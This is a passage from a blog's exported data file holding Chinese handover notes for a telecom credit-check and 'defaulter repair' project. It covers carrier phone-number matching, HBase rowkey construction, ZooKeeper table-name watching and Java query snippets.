class=\"headerlink\" title=\"2.2 修复\"></a>2.2 修复</h5><p>修复是电话号码和身份证不一致时，去联通，电信，或移动进行匹配，得到对应身份证下面的号码。</p>\n<h5 id=\"版本一\"><a href=\"#版本一\" class=\"headerlink\" title=\"版本一\"></a>版本一</h5><ul>\n<li>单网</li>\n</ul>\n<p>去联通查，每个身份证可以匹配多个号码，并对结果进行排序</p>\n<ul>\n<li>三网</li>\n</ul>\n<p>去三网查，但是不能马上得到返回结果。需要轮询。和张硕鹏讨论后，决定采用惰性轮询<br>,减少资源占用。<br></p>\n<p>这里接口需要得入参为json格式得txt文件，所以自己生成临时文件，并在请求时按照文件类型报文，手动构造Post文件的请求体。<br></p>\n<p>轮询得到的结果是一个外网文件地址。需要在代码中使用正向代理，获取文件，并对文件内容进行统计得到结果。</p>\n<h5 id=\"版本二\"><a href=\"#版本二\" class=\"headerlink\" title=\"版本二\"></a>版本二</h5><p>不分为单网三网，而是分为联通，移动，电信 三种</p>\n<ul>\n<li>联通</li>\n</ul>\n<p>按照原先单网逻辑</p>\n<ul>\n<li>电信</li>\n</ul>\n<p>嵌入电信外呼页面，并提交数据</p>\n<ul>\n<li>移动</li>\n</ul>\n<p>嵌入移动外呼页面。并提交数据</p>\n<p>问题：</p>\n<p>嵌入的页面为 https, 然后所用证书多半为自己申请的免费证书，导致浏览器不信任<br></p>\n<p>接口文档未给，处理逻辑未给, 甲方与电信移动沟通中<br></p>\n<h2 id=\"三-其它一些注意点\"><a href=\"#三-其它一些注意点\" class=\"headerlink\" title=\"三.其它一些注意点\"></a>三.其它一些注意点</h2><h3 id=\"1-规范\"><a href=\"#1-规范\" class=\"headerlink\" title=\"1.规范\"></a>1.规范</h3><p>方法注释，swagger等注释要完整<br></p>\n<p>返回消息用 ResultMessage 类型进行统一包装<br></p>\n<p>异常进行统一捕获处理,往前端抛友好提示，不抛异常 <br></p>\n<p>计次等日志类信息，统一用切面处理，不侵入代码<br></p>\n<p>用户管理相关功能，我们不操作门户的数据库，由门户自己进行处理，免得混杂.<br></p>\n<p>前端输入信息，要首先进行验证，避免多余消耗资源操作与安全问题， sql语句尽量用#{} 少用 ${} 防注入。<br></p>\n<p>多条操作，是否需要事务<br></p>\n<h3 id=\"2-其它一些注意点\"><a href=\"#2-其它一些注意点\" class=\"headerlink\" title=\"2.其它一些注意点\"></a>2.其它一些注意点</h3><h4 id=\"2-1-缓存\"><a href=\"#2-1-缓存\" class=\"headerlink\" title=\"2.1 缓存\"></a>2.1 缓存</h4><p>修复接口需要用户信息，自己生成的token,或者用户新建时保存的token和endId等信息。<br>此类信息需进行全局缓存，在项目启动时生成并缓存. 同时提供惰性更新机制，当有新用户时，能自动更新添加新信息。</p>\n<h4 id=\"2-2-跳转\"><a href=\"#2-2-跳转\" class=\"headerlink\" title=\"2.2 跳转\"></a>2.2 跳转</h4><p>原则上，后端不控制页面的跳转，但是为了解决初次登录门户在url后面加上jseesionid 导致的404问题，提供一个额外的跳转接口。</p>\n<h4 id=\"2-3-环境切换问题\"><a href=\"#2-3-环境切换问题\" class=\"headerlink\" title=\"2.3 环境切换问题\"></a>2.3 环境切换问题</h4><p>环境切换需要改两个文件，application.properties和bonc-security-base.properties</p>\n<h4 id=\"2-4-部署分布式\"><a href=\"#2-4-部署分布式\" class=\"headerlink\" title=\"2.4 部署分布式\"></a>2.4 部署分布式</h4><p>部署分布式时，记得做文件共享，找丹姐</p>\n<h4 id=\"2-5-特殊情况\"><a href=\"#2-5-特殊情况\" class=\"headerlink\" title=\"2.5 特殊情况\"></a>2.5 特殊情况</h4><p>如果核验过后，没有不一致的情况(即使有其它核验异常情况)， 再点修复，会返回无需要修复文件(甲方最初需求就这样)</p>\n<h2 id=\"四-后期待解决问题-09-20补充\"><a href=\"#四-后期待解决问题-09-20补充\" class=\"headerlink\" title=\"四.后期待解决问题  09-20补充\"></a>四.后期待解决问题  09-20补充</h2><h3 id=\"1-对接联通页面\"><a href=\"#1-对接联通页面\" class=\"headerlink\" title=\"1.对接联通页面\"></a>1.对接联通页面</h3><h4 id=\"1-1-排序\"><a href=\"#1-1-排序\" class=\"headerlink\" title=\"1.1 排序\"></a>1.1 排序</h4><p>已交给王澍稼</p>\n<h4 id=\"1-2-页面跳转\"><a href=\"#1-2-页面跳转\" class=\"headerlink\" title=\"1.2 页面跳转\"></a>1.2 页面跳转</h4><p>修复完成后，需要点击下一步跳转到联通外呼平台，进行下发。具体下发逻辑我们不管，我们进行对接，能跳转页面就行.<br></p>\n<p>注意: 跳转页面需要自动登录，找联通要接口。需要接口文档。</p>\n<h3 id=\"2-对接移动页面\"><a href=\"#2-对接移动页面\" class=\"headerlink\" title=\"2.对接移动页面\"></a>2.对接移动页面</h3><h4 id=\"2-1-https证书不安全\"><a href=\"#2-1-https证书不安全\" class=\"headerlink\" title=\"2.1 https证书不安全\"></a>2.1 https证书不安全</h4><p>此问题，为移动证书问题，让他们联系移动解决。</p>\n<h4 id=\"2-2-ip无权限\"><a href=\"#2-2-ip无权限\" class=\"headerlink\" title=\"2.2 ip无权限\"></a>2.2 ip无权限</h4><p>不能添加白名单，需要联通的ip,去雍和宫测试.</p>\n<h4 id=\"2-3-页面跳转时自动登录\"><a href=\"#2-3-页面跳转时自动登录\" class=\"headerlink\" title=\"2.3 页面跳转时自动登录\"></a>2.3 页面跳转时自动登录</h4><p>给个能用的接口，接口文档，会不会ip没权限问题？</p>\n<h4 id=\"2-4-移动模板和联通模板不一致\"><a href=\"#2-4-移动模板和联通模板不一致\" class=\"headerlink\" title=\"2.4 移动模板和联通模板不一致\"></a>2.4 移动模板和联通模板不一致</h4><p><img src=\"http://67.216.218.49:8000/file/blogs/others/unrapair_cmcc_template.png\" alt=\"cmcc_template\"></p>\n<p>模板中数据从哪来？授权码是啥,是否需要绑定用户?是否需要修改联通模板？需要的话，涉及到模板文件的从头捋一下。后续电信模板又不一致怎么办？</p>\n<h4 id=\"2-5-进入移动页面后，需要上传修复文件\"><a href=\"#2-5-进入移动页面后，需要上传修复文件\" class=\"headerlink\" title=\"2.5 进入移动页面后，需要上传修复文件\"></a>2.5 进入移动页面后，需要上传修复文件</h4><p>分为核验修复，和直接修复两种情况。<br></p>\n<p>直接修复，直接自己上传文件<br></p>\n<p>核验修复，需先核验，再上传核验过后需要修复的文件.此文件应该我们提供，给个接口，将文件处理成他们想要的格式，提供下载。(是否需要文档)</p>\n<h3 id=\"3-对接电信页面\"><a href=\"#3-对接电信页面\" class=\"headerlink\" title=\"3.对接电信页面\"></a>3.对接电信页面</h3><p>信息不足，暂无.</p>\n<h3 id=\"4-其它\"><a href=\"#4-其它\" class=\"headerlink\" title=\"4.其它\"></a>4.其它</h3>","site":{"data":{}},"excerpt":"","more":"<p>现有项目地址: <a href=\"http://10.191.21.104:8300/unrepair/web/index\" target=\"_blank\" rel=\"noopener\">http://10.191.21.104:8300/unrepair/web/index</a></p>\n<h2 id=\"一-整体介绍\"><a href=\"#一-整体介绍\" class=\"headerlink\" title=\"一.整体介绍\"></a>一.整体介绍</h2><p>失信人修复主要分为三部分：</p>\n<ul>\n<li><p>修复后验证(地理位置验证)</p>\n</li>\n<li><p>失信人修复</p>\n</li>\n<li><p>用户与菜单管理(门户控制)</p>\n</li>\n</ul>\n<h2 id=\"二-具体情况\"><a href=\"#二-具体情况\" class=\"headerlink\" title=\"二.具体情况\"></a>二.具体情况</h2><h3 id=\"1-地理位置验证\"><a href=\"#1-地理位置验证\" class=\"headerlink\" title=\"1.地理位置验证\"></a>1.地理位置验证</h3><h4 id=\"1-1-功能\"><a href=\"#1-1-功能\" class=\"headerlink\" title=\"1.1 功能\"></a>1.1 功能</h4><p>输入手机号和地址，查询出用户号码所在城市，用户号码所在城市，输入地址与实际居住地址距离，等几个指标信息.<br></p>\n<p>这个没什么好说的，比较常规。</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/others/address_verify_01.png\" alt=\"addressVerify\"></p>\n<h4 id=\"1-2-注意点\"><a href=\"#1-2-注意点\" class=\"headerlink\" title=\"1.2 注意点\"></a>1.2 注意点</h4><p>1.经纬度的坐标系不是同一个坐标系，需要进行转化。</p>\n<p>2.因为要调五个不同接口，最好不要串行，使用并发。因为返回值不一样，所以在控制好对应关系，处理时知道哪个结果是哪个接口的返回。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;Future&lt;Map&lt;String,String&gt;&gt;&gt; futures = new ArrayList&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">futures.add(getAddress(jsonObject, permanentAddresss,&quot;permanentAddress&quot;));</span><br><span class=\"line\">futures.add(getAddress(jsonObject, cityName,&quot;realTimeAddress&quot;));</span><br><span class=\"line\">futures.add(getDistance2(jsonObject, workplaceVerification,&quot;workDistance&quot;));</span><br><span class=\"line\">futures.add(getDistance2(jsonObject, houseVerification,&quot;houseDistance&quot;));</span><br><span class=\"line\">futures.add(comparePosition(jsonObject, positionCompare,&quot;positionCompare&quot;));</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-失信人修复\"><a href=\"#2-失信人修复\" class=\"headerlink\" title=\"2.失信人修复\"></a>2.失信人修复</h3><p><img src=\"http://67.216.218.49:8000/file/blogs/others/unrepair_repairType.png\" alt=\"repair\"></p>\n<p>主要分为三种类型，三种类型分别有其对应的文件模板。</p>\n<ul>\n<li>核验加修复</li>\n</ul>\n<p>上传文件，核验，暂存或修复。</p>\n<ul>\n<li>修复</li>\n</ul>\n<p>上传文件，直接进行修复。</p>\n<ul>\n<li>核验</li>\n</ul>\n<p>上传文件，进行核验，将核验结果文件给用户，再决定是否进行修复。</p>\n<p>这里主要讲一下 核验和修复这两块功能的逻辑。其它的上传下载，查询预览之类的常规功能就略过了。</p>\n<h4 id=\"2-1-核验\"><a href=\"#2-1-核验\" class=\"headerlink\" title=\"2.1 核验\"></a>2.1 核验</h4><h5 id=\"2-1-1-流程\"><a href=\"#2-1-1-流程\" class=\"headerlink\" title=\"2.1.1 流程\"></a>2.1.1 流程</h5><p>用户根据类型，下载相应模板，然后上传需要核验的文件(只是一个文件)，后端进行简单的判断后，进行相应的数据补全， 然后调用核验接口，保存结果，并返回数据，同时生成结果文件供下载或进行下一步操作。<br></p>\n<p>核验结果分为四种情况，一致，不一致，调用错误，不存在号码， 只有不一致才进行修复。</p>\n<h5 id=\"2-2-2-问题\"><a href=\"#2-2-2-问题\" class=\"headerlink\" title=\"2.2.2 问题\"></a>2.2.2 问题</h5><p>核验接口为单条，文件可以1000条记录，所以耗时久，改为异步线程池后，一千条记录平均从70s降到了20s,依然有点慢。<br><br>这里需要注意，不能太过增加线程池大小，一方面主机性能不一定够，另一方面，联通接口有QPS限制。</p>\n<h5 id=\"2-2-修复\"><a href=\"#2-2-修复\" class=\"headerlink\" title=\"2.2 修复\"></a>2.2 修复</h5><p>修复是电话号码和身份证不一致时，去联通，电信，或移动进行匹配，得到对应身份证下面的号码。</p>\n<h5 id=\"版本一\"><a href=\"#版本一\" class=\"headerlink\" title=\"版本一\"></a>版本一</h5><ul>\n<li>单网</li>\n</ul>\n<p>去联通查，每个身份证可以匹配多个号码，并对结果进行排序</p>\n<ul>\n<li>三网</li>\n</ul>\n<p>去三网查，但是不能马上得到返回结果。需要轮询。和张硕鹏讨论后，决定采用惰性轮询<br>,减少资源占用。<br></p>\n<p>这里接口需要得入参为json格式得txt文件，所以自己生成临时文件，并在请求时按照文件类型报文，手动构造Post文件的请求体。<br></p>\n<p>轮询得到的结果是一个外网文件地址。需要在代码中使用正向代理，获取文件，并对文件内容进行统计得到结果。</p>\n<h5 id=\"版本二\"><a href=\"#版本二\" class=\"headerlink\" title=\"版本二\"></a>版本二</h5><p>不分为单网三网，而是分为联通，移动，电信 三种</p>\n<ul>\n<li>联通</li>\n</ul>\n<p>按照原先单网逻辑</p>\n<ul>\n<li>电信</li>\n</ul>\n<p>嵌入电信外呼页面，并提交数据</p>\n<ul>\n<li>移动</li>\n</ul>\n<p>嵌入移动外呼页面。并提交数据</p>\n<p>问题：</p>\n<p>嵌入的页面为 https, 然后所用证书多半为自己申请的免费证书，导致浏览器不信任<br></p>\n<p>接口文档未给，处理逻辑未给, 甲方与电信移动沟通中<br></p>\n<h2 id=\"三-其它一些注意点\"><a href=\"#三-其它一些注意点\" class=\"headerlink\" title=\"三.其它一些注意点\"></a>三.其它一些注意点</h2><h3 id=\"1-规范\"><a href=\"#1-规范\" class=\"headerlink\" title=\"1.规范\"></a>1.规范</h3><p>方法注释，swagger等注释要完整<br></p>\n<p>返回消息用 ResultMessage 类型进行统一包装<br></p>\n<p>异常进行统一捕获处理,往前端抛友好提示，不抛异常 <br></p>\n<p>计次等日志类信息，统一用切面处理，不侵入代码<br></p>\n<p>用户管理相关功能，我们不操作门户的数据库，由门户自己进行处理，免得混杂.<br></p>\n<p>前端输入信息，要首先进行验证，避免多余消耗资源操作与安全问题， sql语句尽量用#{} 少用 ${} 防注入。<br></p>\n<p>多条操作，是否需要事务<br></p>\n<h3 id=\"2-其它一些注意点\"><a href=\"#2-其它一些注意点\" class=\"headerlink\" title=\"2.其它一些注意点\"></a>2.其它一些注意点</h3><h4 id=\"2-1-缓存\"><a href=\"#2-1-缓存\" class=\"headerlink\" title=\"2.1 缓存\"></a>2.1 缓存</h4><p>修复接口需要用户信息，自己生成的token,或者用户新建时保存的token和endId等信息。<br>此类信息需进行全局缓存，在项目启动时生成并缓存. 同时提供惰性更新机制，当有新用户时，能自动更新添加新信息。</p>\n<h4 id=\"2-2-跳转\"><a href=\"#2-2-跳转\" class=\"headerlink\" title=\"2.2 跳转\"></a>2.2 跳转</h4><p>原则上，后端不控制页面的跳转，但是为了解决初次登录门户在url后面加上jseesionid 导致的404问题，提供一个额外的跳转接口。</p>\n<h4 id=\"2-3-环境切换问题\"><a href=\"#2-3-环境切换问题\" class=\"headerlink\" title=\"2.3 环境切换问题\"></a>2.3 环境切换问题</h4><p>环境切换需要改两个文件，application.properties和bonc-security-base.properties</p>\n<h4 id=\"2-4-部署分布式\"><a href=\"#2-4-部署分布式\" class=\"headerlink\" title=\"2.4 部署分布式\"></a>2.4 部署分布式</h4><p>部署分布式时，记得做文件共享，找丹姐</p>\n<h4 id=\"2-5-特殊情况\"><a href=\"#2-5-特殊情况\" class=\"headerlink\" title=\"2.5 特殊情况\"></a>2.5 特殊情况</h4><p>如果核验过后，没有不一致的情况(即使有其它核验异常情况)， 再点修复，会返回无需要修复文件(甲方最初需求就这样)</p>\n<h2 id=\"四-后期待解决问题-09-20补充\"><a href=\"#四-后期待解决问题-09-20补充\" class=\"headerlink\" title=\"四.后期待解决问题  09-20补充\"></a>四.后期待解决问题  09-20补充</h2><h3 id=\"1-对接联通页面\"><a href=\"#1-对接联通页面\" class=\"headerlink\" title=\"1.对接联通页面\"></a>1.对接联通页面</h3><h4 id=\"1-1-排序\"><a href=\"#1-1-排序\" class=\"headerlink\" title=\"1.1 排序\"></a>1.1 排序</h4><p>已交给王澍稼</p>\n<h4 id=\"1-2-页面跳转\"><a href=\"#1-2-页面跳转\" class=\"headerlink\" title=\"1.2 页面跳转\"></a>1.2 页面跳转</h4><p>修复完成后，需要点击下一步跳转到联通外呼平台，进行下发。具体下发逻辑我们不管，我们进行对接，能跳转页面就行.<br></p>\n<p>注意: 跳转页面需要自动登录，找联通要接口。需要接口文档。</p>\n<h3 id=\"2-对接移动页面\"><a href=\"#2-对接移动页面\" class=\"headerlink\" title=\"2.对接移动页面\"></a>2.对接移动页面</h3><h4 id=\"2-1-https证书不安全\"><a href=\"#2-1-https证书不安全\" class=\"headerlink\" title=\"2.1 https证书不安全\"></a>2.1 https证书不安全</h4><p>此问题，为移动证书问题，让他们联系移动解决。</p>\n<h4 id=\"2-2-ip无权限\"><a href=\"#2-2-ip无权限\" class=\"headerlink\" title=\"2.2 ip无权限\"></a>2.2 ip无权限</h4><p>不能添加白名单，需要联通的ip,去雍和宫测试.</p>\n<h4 id=\"2-3-页面跳转时自动登录\"><a href=\"#2-3-页面跳转时自动登录\" class=\"headerlink\" title=\"2.3 页面跳转时自动登录\"></a>2.3 页面跳转时自动登录</h4><p>给个能用的接口，接口文档，会不会ip没权限问题？</p>\n<h4 id=\"2-4-移动模板和联通模板不一致\"><a href=\"#2-4-移动模板和联通模板不一致\" class=\"headerlink\" title=\"2.4 移动模板和联通模板不一致\"></a>2.4 移动模板和联通模板不一致</h4><p><img src=\"http://67.216.218.49:8000/file/blogs/others/unrapair_cmcc_template.png\" alt=\"cmcc_template\"></p>\n<p>模板中数据从哪来？授权码是啥,是否需要绑定用户?是否需要修改联通模板？需要的话，涉及到模板文件的从头捋一下。后续电信模板又不一致怎么办？</p>\n<h4 id=\"2-5-进入移动页面后，需要上传修复文件\"><a href=\"#2-5-进入移动页面后，需要上传修复文件\" class=\"headerlink\" title=\"2.5 进入移动页面后，需要上传修复文件\"></a>2.5 进入移动页面后，需要上传修复文件</h4><p>分为核验修复，和直接修复两种情况。<br></p>\n<p>直接修复，直接自己上传文件<br></p>\n<p>核验修复，需先核验，再上传核验过后需要修复的文件.此文件应该我们提供，给个接口，将文件处理成他们想要的格式，提供下载。(是否需要文档)</p>\n<h3 id=\"3-对接电信页面\"><a href=\"#3-对接电信页面\" class=\"headerlink\" title=\"3.对接电信页面\"></a>3.对接电信页面</h3><p>信息不足，暂无.</p>\n<h3 id=\"4-其它\"><a href=\"#4-其它\" class=\"headerlink\" title=\"4.其它\"></a>4.其它</h3>"},{"title":"风控项目交接说明一(征信API)","date":"2019-09-18T15:20:34.000Z","_content":"\n## 一.整体介绍\n\n征信项目现有140多个接口.<br>\n\n每个接口都是一个单独的项目，有 webservice 和 springboot 两种类型，但是除了接口请求方式外，里面\n具体处理逻辑基本一致。<br>\n\n项目地址: https://code.bonc.com.cn/groups/zhengXinApi\n\n![zhengxinapi](http://67.216.218.49:8000/file/blogs/others/zhengxinapi_01.png)\n\n\n## 二.具体情况\n\n因为所有接口基本一个流程，所以举一个例子来进行介绍(三要素验证，4档，用户状态验证).<br>\n\n讲具体逻辑之前，先看看HBase数据存储格式.\n\n\n### 1.Hbase\n\n\nHBase 是一个NoSQL数据库，用于处理海量数据，可以支持10亿行百万列的大表.<br>\n\n底层依赖于 HDFS(Hadoop Distributed File System) 作为存储空间.\n\n#### 1.1 数据存储格式\n\n\n如图这是HBase中的某张表的格式。\n\n![Hbase1](http://67.216.218.49:8000/file/blogs/database/hbase/hbase_database_01.png)\n\n 字段意思 : <br>\n\n- rowkey\n\n行键，用来确定具体的某一行。\n\n- family\n\n列簇，列簇将表切割成不同部分。字节数组。\n\n- qualifier\n\n列，列属于列簇，列的数量没有限制，可以动态添加.字节数组。\n\n- cell\n\n存储具体数据的单元 . 没有数据类型，字节数组的形式存储.<br>\n在HBase每个cell存储单元对同一份数据有多个版本，根据唯一的时间戳来\n区分每个版本之间的差异，时间戳可以由HBase(在数据写入时自动)赋值，\n此时时间戳是精确到毫秒的当前系统时间，也可以由自己显示指定，按照时\n间戳倒序排序，最新的数据排在最前面。\n\n#### 1.2 从表中取数据\n\n\n由{rowkey，column(family + qualifier)，version}唯一确定的单元.<br>\n注意，列中包含了列簇和列簇下面具体的列.<br>\n\n所以取数据一般流程为:<br>\n得到表名 --> 得到rowkey --> 根据column取得cell --> 取出数据.\n\n```\n//table\nTable table = connection.getTable(TableName.valueOf(tableName));\n\n//rowkey\nbyte[] rowkeyHash = Bytes.toBytes((short)(mobnol.hashCode() & 0x7FFF));\nbyte[] key = Bytes.add(rowkeyHash, Bytes.toBytes(mobnol));\nGet get = new Get(key);\n\n//value\nResult result = table.get(get);\nif (!result.isEmpty()) {\n  byte[] value = result.getValue(FAMILYNAME, QUALIFIER);\n}\n```\n\n### 2.整体流程\n\n![zhengxinapi](http://67.216.218.49:8000/file/blogs/others/zhengxinapi_02.png)\n\n由上面可知，要获取数据，需先得到表名和rowkey,其实还需要column值，但是column固定为(f簇,q列),所以不需要再获取.\n\n\n### 3.rowkey构造\n\nrowkey的构建规则与数据入库的规则有关。<br>\n征信项目现有三种类型的HBase库(主备库，信令库，交际圈库),具体在交接文档(征信接口列表—迁移后 20181212.xls)中有注明.\n\n- 主备库\n\n例子:https://code.bonc.com.cn/zhengXinApi/credit (三要素验证,四档)\n\n```\nbyte[] rowkeyHash = Bytes.toBytes((short)(\"电话号码MD5\".hashCode() & 0x7FFF));\nbyte[] key = Bytes.add(rowkeyHash, Bytes.toBytes(\"电话号码MD5\"));\nGet get = new Get(key);\n```\n\n- 信令库\n\n例子:https://code.bonc.com.cn/zhengXinApi/query  (实时位置查询)\n```\nbyte[] phone_id = Bytes.copy(Bytes.toBytes(Long.parseLong(TelNo)), 3, 5);\nbyte[] phone_id_hash = Bytes.toBytes((short) (TelNo.hashCode() & 0x7fff));\nbyte[] key = Bytes.add(phone_id_hash, phone_id);\nGet get = new Get(key);\n```\n\n- 交际圈库\n\n例子:https://code.bonc.com.cn/zhengXinApi/amc_istopcontact (是否联系人手机号验证，电信合作版)\n\n```\nbyte[] deice_number_hash = Bytes.toBytes((short)(device_Number.hashCode() & 0x7FFF));\nbyte[] deice_number = Bytes.toBytes(device_Number);\nbyte[] oppose_number = Bytes.toBytes(oppose_Number);\nbyte[] key = Bytes.add(deice_number_hash, deice_number, oppose_number);\nScan s = new Scan();\ns.setStartRow(Bytes.add(key, Bytes.toBytes(0)));\ns.setStopRow(Bytes.add(key, Bytes.toBytes(999999999)));\n```\n\n这里是用的Scan<br>\n按指定rowkey获取唯一一条记录：get方法。<br>\n按指定条件获取一批记录：scan方法。\n\n### 4.tableName获取\n\n在这里先简单介绍下zookeeper.<br>\n具体的我没仔细看，这里是一篇详细介绍的文章: https://blog.csdn.net/guchuanyun111/article/details/52091318\n\n\n#### 4.1 Zookeeper简要了解\n\nZooKeeper主要是为分布式系统提供一致性协调(Coordination)服务。简单讲就是，如果某个节点宕机后，Zookeeper会通过选举算法重新选出一个节点，保证它不会由于单一节点的故障而造成问题.<br>\n\nZookeeper中存储的数据为树形结构，其上的每一个节点称为znode<br>\n![znode](http://67.216.218.49:8000/file/blogs/others/zhengxinapi_znode_01.jpg)\n\n如征信用户验证表名节点路径为\n```\n <property name=\"zkTableNamePath\" value=\"/fengkong/table/user_check\" />\n```\n\nZooKeeper中的Watch机制(观察者模式)：Client可以在某个ZNode上设置一个Watcher，来Watch该ZNode上的变化。如果该ZNode上有相应的变化，就会触发这个Watcher，把相应的事件通知给设置Watcher的Client。需要注意的是，ZooKeeper中的Watcher是一次性的，即触发一次就会被取消，如果想继续Watch的话，需要客户端重新设置Watcher。\n\n#### 4.2 征信接口中的Zookeeper使用\n\n##### 4.2.1 为什么要用zookeeper\n\n以前征信接口项目中的表名都是放在redis还是oracle中的。表名会定期更新<br>\n后来出现了机房网络割接，导致某个数据库不可用，导致接口不可用，所以将之切换到了zookeeper中，某个节点挂掉不会影响使用.\n\n##### 4.2.2 怎么用\n\n\n连接zk时，注册该节点为监控状态<br>\npublic ZooKeeper(String connectString, int sessionTimeout, Watcher watcher) throws IOException{}\n```\npublic ZooKeeperConnection(String connectString, int sessionTimeOut, InitUtil initUtil) {\n       this.connectString = connectString;\n       this.sessionTimeOut = sessionTimeOut;\n       this.initUtil = initUtil;\n       try {\n           //zk的连接是异步的，建立连接后会调用process方法。\n           zooKeeper = new ZooKeeper(\"xx.xx.xx.xx:2181,xx.xx.xx.xx:2181,xx.xx.xx.xx8:2181\", sessionTimeOut, this);\n       } catch (IOException e) {\n           e.printStackTrace();\n           logger.error(\"zk创建失败,\" + e.toString());\n       } catch (NullPointerException e) {\n           e.printStackTrace();\n           //logger.error(\"zk创建失败,connectString: \" + prop.getConnectString() + \",sessionTimeOut: \" + prop.getSessionTimeOut() + \",\" + e.toString());\n       }\n\n   }\n```\n\n从zk节点中获取表名,获取到数据时，重新注册为被监控状态.<br>\npublic byte[] getData(String path, boolean watch, Stat stat) throws KeeperException, InterruptedException { }\n\n```\n@Override\npublic void process(WatchedEvent event) {\n   try {\n       //连接事件\n       if (event.getType() == Event.EventType.None) {\n           logger.info(\"连接事件\");\n           //连接成功\n           if (event.getState() == Event.KeeperState.SyncConnected) {\n               logger.info(\"建立连接\");\n               String tableName = new String(zooKeeper.getData(initUtil.getZkTableNamePath(),true,null));\n               initUtil.setTableName(tableName);\n\n           } else if (event.getState() == Event.KeeperState.Expired || event.getState() == Event.KeeperState.Disconnected) {\n               logger.info(event.getState() == Event.KeeperState.Expired ? \"客户端超时\" : \"客户端断开连接\");\n               try {\n                   if (zooKeeper != null) {\n                       try {\n                           zooKeeper.close();\n                           zooKeeper = null;\n                       } catch (Exception e) {\n                           e.printStackTrace();\n                           logger.error(\"zk状态:\" + zooKeeper.getState() + \",\" + e.toString());\n                       }\n                   }\n                   zooKeeper = new ZooKeeper(connectString, sessionTimeOut, this);\n               } catch (IOException e) {\n                   e.printStackTrace();\n                   logger.error(\"zk创建失败,\" + e.toString());\n               }\n           }\n       } else if (event.getType() == Event.EventType.NodeDataChanged) {\n           //todo 这里是单个路径发生变化，上面是启动时/重连时 对所有路径进行监听\n           logger.info(\"节点值变化事件\");\n           String tableName = new String(zooKeeper.getData(initUtil.getZkTableNamePath(),true,null));\n           initUtil.setTableName(tableName);\n       }\n   } catch (KeeperException | InterruptedException e) {\n       e.printStackTrace();\n   }\n}\n```\n\n### 5.数据获取\n\n在tableName 和 rowkey 已知后，就可以直接获取数据了。但是在主备库情况下，主库备库都需要查询，又因为确定了只有两个库，所以在这里直接new了两个线程，不用使用线程池。\n```\npublic List<String> threadQuery(Get get,String tableName,String logInfo){\n\tList<HbaseQueryUserThread> threadList = new ArrayList<>();\n\tList<String> resultList = null;\n\tfor (String zkroot : HBasePool.getZKROOT()) {\n\t\ttry {\n\t\t\tHbaseQueryUserThread thread = new HbaseQueryUserThread(get, HBasePool.getHConnection(zkroot), tableName, logInfo);\n\t\t\tthread.setName(\"/hbase_zx\".equals(zkroot) ? \"主库\" : \"备库\");\n\t\t\tthreadList.add(thread);\n\t\t\tthread.start();\n\t\t} catch (IOException e) {\n\t\t\tSystem.out.println(\"hbase创建出错===================================\");\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n\t//完成计数\n\tint finish = 0;\n\n\tw:while (finish != threadList.size()) {\n\t\t//重置完成计数\n\t\tfinish = 0;\n\t\ttry {\n\t\t\tThread.sleep(1);\n\t\t} catch (InterruptedException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\tfor (HbaseQueryUserThread t : threadList) {\n\t\t\t//System.out.println(t.getName() + \"线程状态：\" + t.getState());\n\t\t\t//线程存活\n\t\t\tif (!t.isAlive()) {\n\t\t\t\t//结束 标识增加\n\t\t\t\tfinish++;\n\t\t\t\t//赋值\n\t\t\t\tresultList = t.getList();\n\t\t\t\t//有结果\n\t\t\t\tif (t.getList().size() > 0){\n\t\t\t\t\t//System.out.println(\"跳出for\");\n\t\t\t\t\t//中断其他线程\n\t\t\t\t\tfor (HbaseQueryUserThread thread : threadList){\n\t\t\t\t\t\tthread.interrupt();\n\t\t\t\t\t}\n\t\t\t\t\t//跳出while循环\n\t\t\t\t\tbreak w;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn resultList;\n}\n```\n","source":"_posts/风控项目交接说明一.md","raw":"---\ntitle: 风控项目交接说明一(征信API)\ndate: 2019-09-18 11:20:34\ntags: [others]\n---\n\n## 一.整体介绍\n\n征信项目现有140多个接口.<br>\n\n每个接口都是一个单独的项目，有 webservice 和 springboot 两种类型，但是除了接口请求方式外，里面\n具体处理逻辑基本一致。<br>\n\n项目地址: https://code.bonc.com.cn/groups/zhengXinApi\n\n![zhengxinapi](http://67.216.218.49:8000/file/blogs/others/zhengxinapi_01.png)\n\n\n## 二.具体情况\n\n因为所有接口基本一个流程，所以举一个例子来进行介绍(三要素验证，4档，用户状态验证).<br>\n\n讲具体逻辑之前，先看看HBase数据存储格式.\n\n\n### 1.Hbase\n\n\nHBase 是一个NoSQL数据库，用于处理海量数据，可以支持10亿行百万列的大表.<br>\n\n底层依赖于 HDFS(Hadoop Distributed File System) 作为存储空间.\n\n#### 1.1 数据存储格式\n\n\n如图这是HBase中的某张表的格式。\n\n![Hbase1](http://67.216.218.49:8000/file/blogs/database/hbase/hbase_database_01.png)\n\n 字段意思 : <br>\n\n- rowkey\n\n行键，用来确定具体的某一行。\n\n- family\n\n列簇，列簇将表切割成不同部分。字节数组。\n\n- qualifier\n\n列，列属于列簇，列的数量没有限制，可以动态添加.字节数组。\n\n- cell\n\n存储具体数据的单元 . 没有数据类型，字节数组的形式存储.<br>\n在HBase每个cell存储单元对同一份数据有多个版本，根据唯一的时间戳来\n区分每个版本之间的差异，时间戳可以由HBase(在数据写入时自动)赋值，\n此时时间戳是精确到毫秒的当前系统时间，也可以由自己显示指定，按照时\n间戳倒序排序，最新的数据排在最前面。\n\n#### 1.2 从表中取数据\n\n\n由{rowkey，column(family + qualifier)，version}唯一确定的单元.<br>\n注意，列中包含了列簇和列簇下面具体的列.<br>\n\n所以取数据一般流程为:<br>\n得到表名 --> 得到rowkey --> 根据column取得cell --> 取出数据.\n\n```\n//table\nTable table = connection.getTable(TableName.valueOf(tableName));\n\n//rowkey\nbyte[] rowkeyHash = Bytes.toBytes((short)(mobnol.hashCode() & 0x7FFF));\nbyte[] key = Bytes.add(rowkeyHash, Bytes.toBytes(mobnol));\nGet get = new Get(key);\n\n//value\nResult result = table.get(get);\nif (!result.isEmpty()) 